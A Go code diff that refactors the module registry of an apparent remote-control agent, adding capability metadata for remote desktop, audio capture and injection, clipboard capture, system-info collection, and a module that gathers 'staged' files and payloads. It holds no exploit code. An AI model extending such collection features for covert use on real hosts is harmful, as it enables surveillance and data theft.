@@ -29,9 +29,21 @@ type moduleRuntime struct {
 	BuildVersion string
 }
 
+type ModuleCapability struct {
+	Name        string
+	Description string
+}
+
+type ModuleMetadata struct {
+	ID           string
+	Title        string
+	Description  string
+	Commands     []string
+	Capabilities []ModuleCapability
+}
+
 type module interface {
-	Name() string
-	Commands() []string
+	Metadata() ModuleMetadata
 	Update(moduleRuntime) error
 	HandleCommand(context.Context, protocol.Command) protocol.CommandResult
 	Shutdown(context.Context)
@@ -39,6 +51,7 @@ type module interface {
 
 type moduleEntry struct {
 	module   module
+	metadata ModuleMetadata
 	commands []string
 }
 
@@ -66,14 +79,26 @@ func newModuleRegistry() *moduleRegistry {
 }
 
 func (r *moduleRegistry) register(m module) {
+	metadata := m.Metadata()
+	if strings.TrimSpace(metadata.ID) == "" {
+		panic("agent module missing metadata id")
+	}
+	commands := metadata.Commands
+	if len(commands) == 0 {
+		panic(fmt.Sprintf("agent module %s does not declare any commands", metadata.ID))
+	}
 	entry := &moduleEntry{
 		module:   m,
-		commands: append([]string(nil), m.Commands()...),
+		metadata: metadata,
+		commands: append([]string(nil), commands...),
 	}
 	r.lifecycle = append(r.lifecycle, entry)
 	for _, command := range entry.commands {
 		if strings.TrimSpace(command) == "" {
 			continue
+		}
+		if existing, ok := r.modules[command]; ok {
+			panic(fmt.Sprintf("command %q already registered by module %s", command, existing.metadata.ID))
 		}
 		r.modules[command] = entry
 	}
@@ -86,11 +111,26 @@ func (r *moduleRegistry) Update(runtime moduleRuntime) error {
 	var errs []error
 	for _, entry := range r.lifecycle {
 		if err := entry.module.Update(runtime); err != nil {
-			errs = append(errs, fmt.Errorf("%s: %w", entry.module.Name(), err))
+			label := entry.metadata.Title
+			if strings.TrimSpace(label) == "" {
+				label = entry.metadata.ID
+			}
+			errs = append(errs, fmt.Errorf("%s: %w", label, err))
 		}
 	}
 
 	return errors.Join(errs...)
+}
+
+func (r *moduleRegistry) Metadata() []ModuleMetadata {
+	r.mu.RLock()
+	defer r.mu.RUnlock()
+
+	metadata := make([]ModuleMetadata, 0, len(r.lifecycle))
+	for _, entry := range r.lifecycle {
+		metadata = append(metadata, entry.metadata)
+	}
+	return metadata
 }
 
 func (r *moduleRegistry) HandleCommand(ctx context.Context, cmd protocol.Command) (bool, protocol.CommandResult) {
@@ -130,9 +170,24 @@ type remoteDesktopModule struct {
 	streamer *remotedesktop.RemoteDesktopStreamer
 }
 
-func (m *remoteDesktopModule) Name() string { return "remote-desktop" }
-
-func (m *remoteDesktopModule) Commands() []string { return []string{"remote-desktop"} }
+func (m *remoteDesktopModule) Metadata() ModuleMetadata {
+	return ModuleMetadata{
+		ID:          "remote-desktop",
+		Title:       "Remote Desktop",
+		Description: "Interactive remote desktop streaming and control.",
+		Commands:    []string{"remote-desktop"},
+		Capabilities: []ModuleCapability{
+			{
+				Name:        "remote-desktop.stream",
+				Description: "Stream high fidelity desktop frames to the controller UI.",
+			},
+			{
+				Name:        "remote-desktop.input",
+				Description: "Relay keyboard and pointer input events back to the host.",
+			},
+		},
+	}
+}
 
 func (m *remoteDesktopModule) Update(runtime moduleRuntime) error {
 	cfg := remotedesktop.Config{
@@ -173,9 +228,24 @@ type audioModule struct {
 	bridge *audioctrl.AudioBridge
 }
 
-func (m *audioModule) Name() string { return "audio-control" }
-
-func (m *audioModule) Commands() []string { return []string{"audio-control"} }
+func (m *audioModule) Metadata() ModuleMetadata {
+	return ModuleMetadata{
+		ID:          "audio-control",
+		Title:       "Audio Control",
+		Description: "Capture and inject audio streams across the remote session.",
+		Commands:    []string{"audio-control"},
+		Capabilities: []ModuleCapability{
+			{
+				Name:        "audio.capture",
+				Description: "Capture remote system audio for operator playback.",
+			},
+			{
+				Name:        "audio.inject",
+				Description: "Inject operator supplied audio into the remote session.",
+			},
+		},
+	}
+}
 
 func (m *audioModule) Update(runtime moduleRuntime) error {
 	cfg := audioctrl.Config{
@@ -216,9 +286,24 @@ type clipboardModule struct {
 	manager *clipboard.Manager
 }
 
-func (m *clipboardModule) Name() string { return "clipboard" }
-
-func (m *clipboardModule) Commands() []string { return []string{"clipboard"} }
+func (m *clipboardModule) Metadata() ModuleMetadata {
+	return ModuleMetadata{
+		ID:          "clipboard",
+		Title:       "Clipboard Manager",
+		Description: "Synchronize clipboard data between the operator and remote host.",
+		Commands:    []string{"clipboard"},
+		Capabilities: []ModuleCapability{
+			{
+				Name:        "clipboard.capture",
+				Description: "Capture clipboard updates emitted by the remote workstation.",
+			},
+			{
+				Name:        "clipboard.push",
+				Description: "Push operator provided clipboard payloads to the remote host.",
+			},
+		},
+	}
+}
 
 func (m *clipboardModule) Update(runtime moduleRuntime) error {
 	cfg := clipboard.Config{
@@ -259,9 +344,24 @@ type recoveryModule struct {
 	manager *recovery.Manager
 }
 
-func (m *recoveryModule) Name() string { return "recovery" }
-
-func (m *recoveryModule) Commands() []string { return []string{"recovery"} }
+func (m *recoveryModule) Metadata() ModuleMetadata {
+	return ModuleMetadata{
+		ID:          "recovery",
+		Title:       "Recovery Operations",
+		Description: "Coordinate staged collection tasks and payload recovery.",
+		Commands:    []string{"recovery"},
+		Capabilities: []ModuleCapability{
+			{
+				Name:        "recovery.queue",
+				Description: "Queue recovery jobs for background execution.",
+			},
+			{
+				Name:        "recovery.collect",
+				Description: "Collect files and artifacts staged by other modules.",
+			},
+		},
+	}
+}
 
 func (m *recoveryModule) Update(runtime moduleRuntime) error {
 	cfg := recovery.Config{
@@ -302,9 +402,24 @@ type systemInfoModule struct {
 	collector *systeminfo.Collector
 }
 
-func (m *systemInfoModule) Name() string { return "system-info" }
-
-func (m *systemInfoModule) Commands() []string { return []string{"system-info"} }
+func (m *systemInfoModule) Metadata() ModuleMetadata {
+	return ModuleMetadata{
+		ID:          "system-info",
+		Title:       "System Information",
+		Description: "Collect host metadata, hardware configuration, and runtime inventory.",
+		Commands:    []string{"system-info"},
+		Capabilities: []ModuleCapability{
+			{
+				Name:        "system-info.snapshot",
+				Description: "Provide a structured snapshot of operating system and hardware data.",
+			},
+			{
+				Name:        "system-info.telemetry",
+				Description: "Report live telemetry metrics used by other modules for scheduling.",
+			},
+		},
+	}
+}
 
 func (m *systemInfoModule) Update(runtime moduleRuntime) error {
 	if runtime.Provider == nil {
